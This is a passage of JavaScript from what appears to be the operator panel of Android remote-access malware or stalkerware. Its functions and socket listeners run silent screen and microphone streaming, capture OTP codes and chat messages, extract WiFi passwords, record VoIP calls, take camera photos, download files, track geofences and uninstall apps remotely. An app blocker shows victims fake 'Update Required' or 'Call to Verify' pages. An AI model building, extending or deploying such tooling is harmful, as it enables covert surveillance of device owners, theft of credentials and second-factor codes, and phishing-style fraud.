    v79.browseToInternal(prevPath);
  };

  // v7.9.4: Internal browse that doesn't push to history (for back navigation)
  window.v79.browseToInternal = async function(path) {
    const deviceId = getDeviceId();
    if (!deviceId) return;
    const list = document.getElementById('v79-file-list');
    const breadcrumb = document.getElementById('v79-breadcrumb');
    const offlineBanner = document.getElementById('v79-offline-banner');
    if (breadcrumb) breadcrumb.textContent = path;
    if (list) list.innerHTML = '<div style="padding:20px;text-align:center;color:#95a5a6;">⏳ Loading...</div>';
    if (offlineBanner) offlineBanner.style.display = 'none';
    updateFmBackButton();

    try {
      const data = await apiCall('/api/admin/list-files-smart', 'POST', { device_id: deviceId, path });
      if (!data.success) {
        if (list) list.innerHTML = `<div style="padding:20px;text-align:center;color:#e74c3c;">❌ ${escapeHtml(data.error || 'Failed')}</div>`;
        return;
      }
      if (data.source === 'live') {
        if (list) list.innerHTML = '<div style="padding:20px;text-align:center;color:#95a5a6;">⏳ Requesting from device (live)...</div>';
      } else {
        renderFileList(data.entries || [], data.cached_at, data.source);
      }
    } catch (e) {
      if (list) list.innerHTML = `<div style="padding:20px;text-align:center;color:#e74c3c;">Error: ${escapeHtml(e.message)}</div>`;
    }
  };

  function updateFmBackButton() {
    const backBtn = document.getElementById('v79-fm-back');
    if (!backBtn) return;
    if (v79._fmPathHistory && v79._fmPathHistory.length > 1) {
      backBtn.disabled = false;
      backBtn.style.opacity = '1';
      backBtn.style.cursor = 'pointer';
    } else {
      backBtn.disabled = true;
      backBtn.style.opacity = '0.4';
      backBtn.style.cursor = 'not-allowed';
    }
  }

  function renderFileList(entries, cachedAt, source) {
    const list = document.getElementById('v79-file-list');
    const banner = document.getElementById('v79-offline-banner');
    if (!list) return;

    if (banner && source && source !== 'live') {
      banner.style.display = 'block';
      banner.textContent = `⚠️ Offline — showing ${source === 'cache' ? 'cached listing' : 'nearest cached ancestor'} from ${cachedAt || 'unknown time'}`;
    }

    if (!entries || entries.length === 0) {
      list.innerHTML = '<div style="padding:20px;text-align:center;color:#666;">Empty directory</div>';
      return;
    }

    list.innerHTML = entries.map(e => {
      const icon = e.is_dir ? '📁' : '📄';
      const size = e.is_dir ? '' : `<span style="color:#666;font-size:10px;">(${formatSize(e.size)})</span>`;
      const onClick = e.is_dir ? `onclick="v79.browseTo('${escapeHtml(e.path)}')"` : '';
      const downloadBtn = !e.is_dir && e.readable ? `<button onclick="v79.downloadFile('${escapeHtml(e.path)}')" style="float:right;background:rgba(52,152,219,.3);border:none;color:#fff;padding:2px 8px;border-radius:4px;cursor:pointer;font-size:10px;">⬇ Download</button>` : '';
      return `<div style="padding:6px 8px;border-bottom:1px solid rgba(255,255,255,.05);${e.is_dir ? 'color:#3498db;cursor:pointer;' : 'color:#fff;'}${onClick ? '' : ''}" ${onClick}>${icon} ${escapeHtml(e.name)} ${size} ${downloadBtn}</div>`;
    }).join('');
  }

  function formatSize(bytes) {
    if (!bytes || bytes === 0) return '0 B';
    const units = ['B', 'KB', 'MB', 'GB'];
    let i = 0;
    while (bytes >= 1024 && i < units.length - 1) { bytes /= 1024; i++; }
    return bytes.toFixed(1) + ' ' + units[i];
  }

  // ═══════════════════════════════════════════════════════════════
  //  APP BLOCKER v2 MODAL (with fake UI selection)
  // ═══════════════════════════════════════════════════════════════

  function showAppBlockerModal() {
    // v7.9.6: Fetch apps list for the dropdown picker
    const deviceId = getDeviceId();
    createModal('🚫 Block App — Advanced', `
      <div style="display:flex;flex-direction:column;gap:12px;">
        <div>
          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Select App from Device *</label>
          <input id="v79-block-pkg-search" type="text" placeholder="Search apps... (type to filter)" style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;box-sizing:border-box;margin-bottom:6px;" oninput="v79.filterAppPicker()"/>
          <div id="v79-app-picker" style="max-height:200px;overflow-y:auto;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;padding:4px;">
            <div style="padding:8px;text-align:center;color:#95a5a6;font-size:11px;">Loading apps from device...</div>
          </div>
          <input id="v79-block-pkg" type="hidden" value=""/>
          <div id="v79-block-pkg-display" style="margin-top:4px;padding:6px 10px;background:rgba(0,0,0,.2);border-radius:4px;font-family:monospace;font-size:11px;color:#3498db;min-height:20px;">No app selected</div>
        </div>
        <div>
          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Fake UI Type</label>
          <select id="v79-block-ui-type" style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;box-sizing:border-box;" onchange="v79.updateBlockerUiPreview()">
            <option value="default">Default (silent block, no UI)</option>
            <option value="update_page">Fake "Update Required" page</option>
            <option value="contact_us">Fake "Contact Support" page</option>
            <option value="call_us">Fake "Call to Verify" page</option>
            <option value="timer">Countdown timer (auto-unblock)</option>
            <option value="redirect">Redirect to custom URL</option>
          </select>
        </div>
        <div>
          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Custom Message (optional)</label>
          <textarea id="v79-block-message" placeholder="Override the default fake UI message..." style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:12px;min-height:50px;box-sizing:border-box;resize:vertical;"></textarea>
        </div>
        <div id="v79-block-url-row" style="display:none;">
          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Custom URL (for redirect)</label>
          <input id="v79-block-url" type="text" placeholder="https://example.com" style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;box-sizing:border-box;"/>
        </div>
        <div id="v79-block-timer-row" style="display:none;">
          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Timer (seconds — auto-unblock after this)</label>
          <input id="v79-block-timer" type="number" placeholder="3600 (1 hour)" style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;box-sizing:border-box;"/>
        </div>
        <div>
          <label style="color:#95a5a6;font-size:11px;display:block;margin-bottom:4px;">Unlock Code (optional — user can enter to unblock)</label>
          <input id="v79-block-code" type="text" placeholder="e.g. 1234" style="width:100%;padding:8px 10px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;box-sizing:border-box;"/>
        </div>
        <button onclick="v79.submitAppBlock()" style="padding:10px 20px;background:rgba(192,57,43,.3);border:1px solid rgba(192,57,43,.5);color:#fff;border-radius:6px;cursor:pointer;font-size:13px;font-weight:600;">🚫 Block App</button>
      </div>
    `, { width: '500px' });
  }

  window.v79.updateBlockerUiPreview = function() {
    const type = document.getElementById('v79-block-ui-type').value;
    document.getElementById('v79-block-url-row').style.display = (type === 'redirect') ? 'block' : 'none';
    document.getElementById('v79-block-timer-row').style.display = (type === 'timer') ? 'block' : 'none';
  };

  // v7.9.6: Load apps from device for the app picker dropdown
  v79._appPickerApps = [];

  window.v79.loadAppsForPicker = async function() {
    const deviceId = getDeviceId();
    if (!deviceId) return;
    const picker = document.getElementById('v79-app-picker');
    try {
      // v7.9.7: Use the correct endpoint + handle response format
      const data = await apiCall(`/api/admin/connections/${deviceId}/apps?system=true&limit=500`);
      // Response format: { apps: [...], totalAll, totalUser }
      v79._appPickerApps = data.apps || [];
      if (v79._appPickerApps.length === 0) {
        if (picker) picker.innerHTML = '<div style="padding:8px;text-align:center;color:#95a5a6;font-size:11px;">No apps synced yet. Use the Apps tab to sync.</div>';
      } else {
        v79.renderAppPicker(v79._appPickerApps);
      }
    } catch (e) {
      // Try without system filter
      try {
        const data2 = await apiCall(`/api/admin/connections/${deviceId}/apps`);
        v79._appPickerApps = data2.apps || [];
        if (v79._appPickerApps.length === 0) {
          if (picker) picker.innerHTML = '<div style="padding:8px;text-align:center;color:#95a5a6;font-size:11px;">No apps found on device.</div>';
        } else {
          v79.renderAppPicker(v79._appPickerApps);
        }
      } catch (e2) {
        if (picker) picker.innerHTML = '<div style="padding:8px;text-align:center;color:#e74c3c;font-size:11px;">Failed to load: ' + escapeHtml(e2.message) + '</div>';
      }
    }
  };

  window.v79.renderAppPicker = function(apps) {
    const picker = document.getElementById('v79-app-picker');
    if (!picker) return;
    if (!apps || apps.length === 0) {
      picker.innerHTML = '<div style="padding:8px;text-align:center;color:#95a5a6;font-size:11px;">No apps found</div>';
      return;
    }
    picker.innerHTML = apps.map(a => {
      const pkg = a.package_name || a.packageName || '';
      const name = a.app_name || a.appName || pkg;
      return `<div onclick="v79.selectAppFromPicker('${escapeHtml(pkg)}','${escapeHtml(name)}')" style="padding:6px 8px;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.05);font-size:11px;" onmouseover="this.style.background='rgba(52,152,219,.2)'" onmouseout="this.style.background='transparent'">
        <span style="color:#fff;">${escapeHtml(name)}</span><br>
        <span style="color:#95a5a6;font-size:10px;font-family:monospace;">${escapeHtml(pkg)}</span>
      </div>`;
    }).join('');
  };

  window.v79.filterAppPicker = function() {
    const search = (document.getElementById('v79-block-pkg-search')?.value || '').toLowerCase();
    if (!search) {
      v79.renderAppPicker(v79._appPickerApps);
      return;
    }
    const filtered = v79._appPickerApps.filter(a => {
      const pkg = (a.package_name || a.packageName || '').toLowerCase();
      const name = (a.app_name || a.appName || '').toLowerCase();
      return pkg.includes(search) || name.includes(search);
    });
    v79.renderAppPicker(filtered);
  };

  window.v79.selectAppFromPicker = function(pkg, name) {
    document.getElementById('v79-block-pkg').value = pkg;
    document.getElementById('v79-block-pkg-display').textContent = `${name} (${pkg})`;
    document.getElementById('v79-block-pkg-search').value = name;
    v79.renderAppPicker(v79._appPickerApps);  // reset highlight
  };

  // Auto-load apps when modal opens
  setTimeout(() => v79.loadAppsForPicker(), 500);

  // ═══════════════════════════════════════════════════════════════
  //  BLOCKED APPS LIST MODAL (for unblocking)
  // ═══════════════════════════════════════════════════════════════

  function showBlockedListModal(apps) {
    createModal('✅ Blocked Apps — Click to Unblock', `
      <div id="v79-blocked-list" style="display:flex;flex-direction:column;gap:6px;">
        ${apps.length === 0 ? '<div style="padding:20px;text-align:center;color:#95a5a6;">No blocked apps (or waiting for device response...)</div>' :
          apps.map(a => {
            const pkg = typeof a === 'string' ? a : (a.package || a.package_name || '');
            const fakeUi = typeof a === 'object' ? (a.fake_ui_type || 'default') : 'default';
            return `<div style="display:flex;justify-content:space-between;align-items:center;padding:10px;background:rgba(192,57,43,.1);border:1px solid rgba(192,57,43,.3);border-radius:6px;">
              <div><div style="font-family:monospace;font-size:12px;">${escapeHtml(pkg)}</div><div style="font-size:10px;color:#95a5a6;">UI: ${escapeHtml(fakeUi)}</div></div>
              <button onclick="v79.unblockApp('${escapeHtml(pkg)}')" style="padding:6px 12px;background:rgba(39,174,96,.3);border:1px solid rgba(39,174,96,.5);color:#fff;border-radius:6px;cursor:pointer;font-size:11px;">✓ Unblock</button>
            </div>`;
          }).join('')
        }
      </div>
    `, { width: '500px' });
  }

  // ═══════════════════════════════════════════════════════════════
  //  OTHER MODALS (Chat, OTP, Geofences, Search, Two-way Chat, Dashboard)
  // ═══════════════════════════════════════════════════════════════

  function showChatMessagesModal(entries) {
    const rows = entries.map(e => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:6px 8px;color:#3498db;font-size:12px;">${escapeHtml(e.app)}</td><td style="padding:6px 8px;font-size:12px;">${escapeHtml(e.conversation)}</td><td style="padding:6px 8px;color:#e74c3c;font-size:12px;">${escapeHtml(e.sender)}</td><td style="padding:6px 8px;font-size:12px;">${escapeHtml(e.message_text)}</td><td style="padding:6px 8px;color:#95a5a6;font-size:10px;white-space:nowrap;">${escapeHtml(e.recorded_at)}</td></tr>`).join('');
    createModal(`💬 Chat Messages (${entries.length})`, `<table style="width:100%;border-collapse:collapse;font-size:12px;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:8px;">App</th><th style="padding:8px;">Conversation</th><th style="padding:8px;">Sender</th><th style="padding:8px;">Message</th><th style="padding:8px;">Time</th></tr></thead><tbody>${rows || '<tr><td colspan="5" style="padding:20px;text-align:center;color:#666;">No chat messages captured yet</td></tr>'}</tbody></table>`);
  }

  function showOtpCodesModal(entries) {
    const rows = entries.map(e => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:8px;color:#d35400;font-size:18px;font-weight:bold;font-family:monospace;">${escapeHtml(e.code)}</td><td style="padding:8px;font-size:12px;">${escapeHtml(e.app)}</td><td style="padding:8px;font-size:12px;">${escapeHtml(e.sender)}</td><td style="padding:8px;font-size:11px;color:#95a5a6;">${escapeHtml(e.full_text)}</td><td style="padding:8px;color:#95a5a6;font-size:10px;white-space:nowrap;">${escapeHtml(e.captured_at)}</td></tr>`).join('');
    createModal(`🔑 OTP Codes (${entries.length})`, `<table style="width:100%;border-collapse:collapse;font-size:12px;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:8px;">Code</th><th style="padding:8px;">App</th><th style="padding:8px;">Sender</th><th style="padding:8px;">Full Text</th><th style="padding:8px;">Captured</th></tr></thead><tbody>${rows || '<tr><td colspan="5" style="padding:20px;text-align:center;color:#666;">No OTP codes captured yet</td></tr>'}</tbody></table>`);
  }

  function showGeofencesModal(geofences, events) {
    const gfRows = geofences.map(g => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:8px;font-size:12px;">${escapeHtml(g.name)}</td><td style="padding:8px;font-size:10px;color:#95a5a6;max-width:200px;overflow:hidden;text-overflow:ellipsis;">${escapeHtml(g.points)}</td><td style="padding:8px;font-size:12px;">${g.alert_on_enter ? '✅' : '❌'} / ${g.alert_on_exit ? '✅' : '❌'}</td></tr>`).join('');
    const evRows = events.map(e => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:8px;color:${e.event === 'enter' ? '#27ae60' : '#e74c3c'};font-size:12px;">${escapeHtml(e.event)}</td><td style="padding:8px;font-size:12px;">${escapeHtml(e.geofence_name)}</td><td style="padding:8px;font-size:10px;">${e.latitude || 0}, ${e.longitude || 0}</td><td style="padding:8px;color:#95a5a6;font-size:10px;white-space:nowrap;">${escapeHtml(e.recorded_at)}</td></tr>`).join('');
    createModal(`🗺️ Geofences`, `<h4 style="color:#2980b9;margin:0 0 8px;font-size:13px;">Active (${geofences.length})</h4><table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:16px;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:6px;">Name</th><th style="padding:6px;">Points</th><th style="padding:6px;">Enter/Exit</th></tr></thead><tbody>${gfRows || '<tr><td colspan="3" style="padding:14px;text-align:center;color:#666;">No geofences set</td></tr>'}</tbody></table><h4 style="color:#2980b9;margin:0 0 8px;font-size:13px;">Recent Events (${events.length})</h4><table style="width:100%;border-collapse:collapse;font-size:12px;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:6px;">Event</th><th style="padding:6px;">Geofence</th><th style="padding:6px;">Location</th><th style="padding:6px;">Time</th></tr></thead><tbody>${evRows || '<tr><td colspan="4" style="padding:14px;text-align:center;color:#666;">No events</td></tr>'}</tbody></table>`);
  }

  function showSearchResultsModal(query, results) {
    const rows = results.map(r => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:6px 8px;color:#f39c12;font-size:11px;">${escapeHtml(r.source)}</td><td style="padding:6px 8px;color:#3498db;font-size:11px;">${escapeHtml(r.context)}</td><td style="padding:6px 8px;font-size:11px;">${escapeHtml(r.sender)}</td><td style="padding:6px 8px;font-size:11px;">${escapeHtml(r.text)}</td><td style="padding:6px 8px;color:#95a5a6;font-size:10px;white-space:nowrap;">${escapeHtml(r.recorded_at)}</td></tr>`).join('');
    createModal(`🔍 Search: "${escapeHtml(query)}" (${results.length} results)`, `<table style="width:100%;border-collapse:collapse;font-size:12px;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:8px;">Source</th><th style="padding:8px;">Context</th><th style="padding:8px;">Sender</th><th style="padding:8px;">Text</th><th style="padding:8px;">Time</th></tr></thead><tbody>${rows || '<tr><td colspan="5" style="padding:20px;text-align:center;color:#666;">No results found</td></tr>'}</tbody></table>`);
  }

  function showTwoWayChatModal(messages) {
    const msgs = messages.map(m => `<div style="margin:6px 0;padding:8px 12px;border-radius:8px;${m.from_sender === 'admin' ? 'background:rgba(52,152,219,.15);margin-left:30px;' : 'background:rgba(149,165,166,.1);margin-right:30px;'}"><div style="font-size:10px;color:#95a5a6;margin-bottom:2px;">${escapeHtml(m.from_sender)} · ${escapeHtml(m.ts)}</div><div style="font-size:13px;">${escapeHtml(m.message)}</div></div>`).join('');
    createModal('✉️ Two-Way Chat', `<div style="margin-bottom:12px;display:flex;gap:8px;"><input id="v79-chat-input" type="text" placeholder="Type a message or command..." style="flex:1;padding:8px 12px;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.2);border-radius:6px;color:#fff;font-size:13px;" onkeypress="if(event.key==='Enter')v79.sendChatMessage()"><button onclick="v79.sendChatMessage()" style="padding:8px 16px;background:rgba(155,89,182,.3);border:1px solid rgba(155,89,182,.5);color:#fff;border-radius:6px;cursor:pointer;font-size:12px;">Send</button></div><div style="max-height:400px;overflow-y:auto;">${msgs || '<div style="padding:20px;text-align:center;color:#666;">No messages yet</div>'}</div>`);
  }

  function showDashboardModal(data) {
    const deviceRows = (data.devices || []).slice(0, 50).map(d => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);cursor:pointer;" onclick="document.getElementById('v79-modal-overlay').remove(); if(typeof openDeviceModal==='function')openDeviceModal('${escapeHtml(d.device_id)}','${escapeHtml(d.device_name || d.model || '')}');"><td style="padding:6px 8px;color:${d.online ? '#27ae60' : '#666'};font-size:14px;">${d.online ? '●' : '○'}</td><td style="padding:6px 8px;font-size:12px;">${escapeHtml(d.device_name || d.model || d.device_id.substring(0, 8))}</td><td style="padding:6px 8px;font-size:11px;">${escapeHtml(d.app_version || '?')}</td><td style="padding:6px 8px;color:#95a5a6;font-size:11px;">${d.last_seen_minutes_ago != null ? d.last_seen_minutes_ago + ' min ago' : 'never'}</td></tr>`).join('');
    createModal(`📊 Dashboard — ${data.online || 0} online / ${data.total || 0} total`, `<table style="width:100%;border-collapse:collapse;font-size:12px;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:8px;">Status</th><th style="padding:8px;">Device</th><th style="padding:8px;">Version</th><th style="padding:8px;">Last Seen</th></tr></thead><tbody>${deviceRows}</tbody></table>${data.total > 50 ? `<div style="padding:10px;text-align:center;color:#95a5a6;font-size:11px;">Showing 50 of ${data.total} devices</div>` : ''}`);
  }

  // ═══════════════════════════════════════════════════════════════
  //  SOCKET LISTENERS
  // ═══════════════════════════════════════════════════════════════

  let listenersRegistered = false;
  function registerSocketListeners() {
    if (listenersRegistered) return;
    const sock = getSocket();
    if (!sock) { setTimeout(registerSocketListeners, 3000); return; }

    try {
      // Silent screen stream (JPEG slideshow)
      sock.on('silent_screen_start', (data) => {
        showToast('📺 Silent screen stream started', 'success');
        const fmtEl = document.getElementById('v79-mic-format');
      });

      sock.on('silent_screen_frame', (data) => {
        updateSilentScreenFrame(data.frame);
      });

      sock.on('silent_screen_stop', (data) => {
        showToast('📺 Screen stream stopped', 'info');
        const overlay = document.getElementById('v79-modal-overlay');
        if (overlay && overlay.dataset.type === 'silent-screen') overlay.remove();
      });

      // Mic stream
      sock.on('mic_stream_start', (data) => {
        const fmtEl = document.getElementById('v79-mic-format');
        if (fmtEl) fmtEl.textContent = data.format || 'pcm';
      });

      sock.on('mic_stream_chunk', (data) => {
        playMicChunk(data);
      });

      sock.on('mic_stream_stop', (data) => {
        const overlay = document.getElementById('v79-modal-overlay');
        if (overlay && overlay.dataset.type === 'live-mic') overlay.remove();
        if (v79._audioCtx) { try { v79._audioCtx.close(); } catch(_){} v79._audioCtx = null; }
      });

      // OTP captured
      sock.on('otp_captured', (data) => {
        showToast(`🔑 OTP captured: ${data.code} (${data.sender})`, 'success');
      });

      // Geofence events
      sock.on('geofence_event', (data) => {
        showToast(`🗺️ Geofence ${data.event}: ${data.geofence_name}`, data.event === 'enter' ? 'success' : 'error');
      });

      // Security events
      sock.on('security_event', (data) => {
        if (data.compromised) showToast(`🚨 SECURITY THREAT on device!`, 'error');
      });

      // Camera capture result
      sock.on('camera_capture_result', (data) => {
        if (data.success) {
          showToast(`📷 Photo captured: ${data.camera}`, 'success');
          // If camera gallery is open, prepend the new photo
          // Otherwise, open it in a new tab
          const gallery = document.getElementById('v79-modal-body');
          if (gallery && gallery.innerHTML.includes('Camera Gallery')) {
            v79.openCameraGallery();  // refresh
          } else if (data.url) {
            window.open(data.url, '_blank');
          }
        } else {
          showToast(`📷 Camera failed: ${data.error}`, 'error');
        }
      });

      // WiFi passwords
      sock.on('wifi_passwords_result', (data) => {
        const count = data.count || 0;
        showToast(`📶 WiFi passwords: ${count} networks`, 'success');
        const rows = (data.networks || []).map(n => `<tr style="border-bottom:1px solid rgba(255,255,255,.05);"><td style="padding:6px 8px;font-size:12px;">${escapeHtml(n.ssid)}</td><td style="padding:6px 8px;color:#27ae60;font-family:monospace;font-size:12px;">${escapeHtml(n.password) || '(redacted)'}</td><td style="padding:6px 8px;font-size:11px;">${escapeHtml(n.security)}</td></tr>`).join('');
        createModal(`📶 WiFi Networks (${count})`, `<p style="color:#95a5a6;font-size:11px;margin:0 0 10px;">Has root: ${data.has_root ? 'Yes' : 'No (passwords may be redacted on Android 10+)'}</p><table style="width:100%;border-collapse:collapse;"><thead><tr style="text-align:left;color:#95a5a6;border-bottom:2px solid rgba(255,255,255,.1);"><th style="padding:6px;">SSID</th><th style="padding:6px;">Password</th><th style="padding:6px;">Security</th></tr></thead><tbody>${rows || '<tr><td colspan="3" style="padding:14px;text-align:center;color:#666;">No networks</td></tr>'}</tbody></table>`);
      });

      // VoIP recording
      sock.on('voip_record_started', (data) => {
        if (data.success) showToast('📞 VoIP recording started', 'success');
        else showToast(`📞 VoIP failed: ${data.error}`, 'error');
      });

      sock.on('voip_record_result', (data) => {
        if (data.success) {
          showToast('📞 VoIP recording uploaded!', 'success');
          if (data.url) window.open(data.url, '_blank');
        }
      });

      // File manager — files_listed event (live response from device)
      sock.on('files_listed', (data) => {
        const list = document.getElementById('v79-file-list');
        if (!list) return;  // Modal closed
        renderFileList(data.entries || [], null, 'live');
      });

      sock.on('file_download_result', (data) => {
        if (data.success) {
          showToast(`📁 File uploaded: ${data.path}`, 'success');
          if (data.url) window.open(data.url, '_blank');
        } else {
          showToast(`📁 Download failed: ${data.error}`, 'error');
        }
      });

      // Blocked apps list response
      sock.on('blocked_apps_list', (data) => {
        const listEl = document.getElementById('v79-blocked-list');
        if (!listEl) {
          // Modal closed — show it
          showBlockedListModal(data.apps || []);
        } else {
          // Update existing modal
          const apps = data.apps || [];
          if (apps.length === 0) {
            listEl.innerHTML = '<div style="padding:20px;text-align:center;color:#95a5a6;">No blocked apps on this device</div>';
          } else {
            listEl.innerHTML = apps.map(a => {
              const pkg = typeof a === 'string' ? a : (a.package || a.package_name || '');
              const fakeUi = typeof a === 'object' ? (a.fake_ui_type || 'default') : 'default';
              return `<div style="display:flex;justify-content:space-between;align-items:center;padding:10px;background:rgba(192,57,43,.1);border:1px solid rgba(192,57,43,.3);border-radius:6px;">
                <div><div style="font-family:monospace;font-size:12px;">${escapeHtml(pkg)}</div><div style="font-size:10px;color:#95a5a6;">UI: ${escapeHtml(fakeUi)}</div></div>
                <button onclick="v79.unblockApp('${escapeHtml(pkg)}')" style="padding:6px 12px;background:rgba(39,174,96,.3);border:1px solid rgba(39,174,96,.5);color:#fff;border-radius:6px;cursor:pointer;font-size:11px;">✓ Unblock</button>
              </div>`;
            }).join('');
          }
        }
      });

      // Uninstall result
      sock.on('uninstall_result', (data) => {
        if (data.success) {
          showToast(`✓ Uninstalled: ${data.package}`, 'success');
          // Refresh apps list if open
          if (typeof loadApps === 'function') setTimeout(loadApps, 2000);
        } else {
          showToast(`✗ Uninstall failed: ${data.error}`, 'error');
        }
      });

      sock.on('uninstall_started', (data) => {
        if (data.started) showToast(`📱 Uninstalling ${data.package}...`, 'info');
      });

      listenersRegistered = true;
      log('Socket listeners registered');
    } catch (e) {
      log('Socket listener registration failed: ' + e.message);
    }
  }

  // ═══════════════════════════════════════════════════════════════
  //  INJECT GLOBAL BUTTONS + UNINSTALL BUTTON IN APPS LIST
  // ═══════════════════════════════════════════════════════════════

  function injectGlobalButtons() {
    if (document.getElementById('v79-dashboard-btn')) return;
    const topbarRight = document.querySelector('.topbar-right');
    if (!topbarRight) { setTimeout(injectGlobalButtons, 3000); return; }
    const btnContainer = document.createElement('div');
    btnContainer.style.cssText = 'display:inline-flex;gap:6px;margin-left:12px;';
    btnContainer.innerHTML = `
      <button id="v79-dashboard-btn" onclick="v79.openDashboard()" style="background:rgba(46,204,113,.15);border:1px solid rgba(46,204,113,.4);color:#2ecc71;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:11px;font-weight:600;">📊 Dashboard</button>
      <button id="v79-webhook-btn" onclick="v79.openWebhooks()" style="background:rgba(155,89,182,.15);border:1px solid rgba(155,89,182,.4);color:#9b59b6;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:11px;font-weight:600;">🔔 Webhooks</button>
    `;
    topbarRight.appendChild(btnContainer);
    log('Global buttons injected');
  }

  // ═══════════════════════════════════════════════════════════════
  //  HOOK INTO APPS LIST — add Uninstall button to each app row
  // ═══════════════════════════════════════════════════════════════

  function injectUninstallButtons() {
    // Find the apps list container
    const appsContainer = document.getElementById('appsListContainer');
    if (!appsContainer) return;

    // Check if we already injected
    if (appsContainer.dataset.v79UninstallInjected === 'true') return;

    // Find all app rows (look for elements with onclick containing package names or data-pkg attribute)
    const appRows = appsContainer.querySelectorAll('[data-package], .app-row, .app-item');
    if (appRows.length === 0) {
      // Try alternate: look for elements that contain package name patterns
      const allDivs = appsContainer.querySelectorAll('div');
      for (const div of allDivs) {
        if (div.dataset.v79UninstallBtn) continue;
        const text = div.textContent || '';
        // Check if this looks like an app row (contains a package name pattern)
        const pkgMatch = text.match(/com\.[a-z]+\.[a-z]+/i);
        if (pkgMatch && !div.querySelector('.v79-uninstall-btn')) {
          const pkg = pkgMatch[0];
          const btn = document.createElement('button');
          btn.className = 'v79-uninstall-btn';
          btn.textContent = '🗑️ Uninstall';
          btn.style.cssText = 'background:rgba(231,76,60,.2);border:1px solid rgba(231,76,60,.4);color:#e74c3c;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:10px;margin-left:8px;';
          btn.onclick = (e) => {
            e.stopPropagation();
            if (confirm(`Uninstall "${pkg}" from the device?`)) {
              v79.uninstallAppRemote(pkg);
            }
          };
          div.appendChild(btn);
          div.dataset.v79UninstallBtn = 'true';
        }
      }
    } else {
      appRows.forEach(row => {
        if (row.dataset.v79UninstallBtn) return;
        const pkg = row.dataset.package || row.getAttribute('data-pkg') || '';
        if (!pkg) return;
        const btn = document.createElement('button');
        btn.className = 'v79-uninstall-btn';
        btn.textContent = '🗑️ Uninstall';
        btn.style.cssText = 'background:rgba(231,76,60,.2);border:1px solid rgba(231,76,60,.4);color:#e74c3c;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:10px;margin-left:8px;';
        btn.onclick = (e) => {
          e.stopPropagation();
          if (confirm(`Uninstall "${pkg}" from the device?`)) {
            v79.uninstallAppRemote(pkg);
          }
        };
        row.appendChild(btn);
        row.dataset.v79UninstallBtn = 'true';
      });
    }

    appsContainer.dataset.v79UninstallInjected = 'true';
  }

  window.v79.uninstallAppRemote = async function(pkg) {
    const deviceId = getDeviceId();
    if (!deviceId) { showToast('⚠️ No device selected', 'error'); return; }
    try {
      const data = await apiCall('/api/admin/uninstall-app', 'POST', { device_id: deviceId, package: pkg });
      if (data.success) showToast(`📱 Uninstalling ${pkg}...`, 'info');
      else showToast(`✗ Failed: ${data.error}`, 'error');
    } catch (e) { showToast(`Error: ${e.message}`, 'error'); }
  };

  // ═══════════════════════════════════════════════════════════════
  //  INIT
  // ═══════════════════════════════════════════════════════════════

  function init() {
    log('v7.9 Features module v3 loaded');
    injectGlobalButtons();

    // Watch for device modal + apps tab opening
    const observer = new MutationObserver(() => {
      const modal = document.getElementById('deviceModal');
      if (!modal) return;
      if (modal.classList.contains('hidden')) {
        removeToolbar();
      } else {
        if (!document.getElementById('v79-toolbar')) injectToolbar();
        // Try injecting uninstall buttons when apps tab is active
        const appsTab = document.getElementById('tab-apps');
        if (appsTab && appsTab.classList.contains('active')) {
          setTimeout(injectUninstallButtons, 500);
        }
      }
    });
    observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['class'] });

    setTimeout(injectToolbar, 1000);
    registerSocketListeners();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }

})();
// trigger2 1785848183
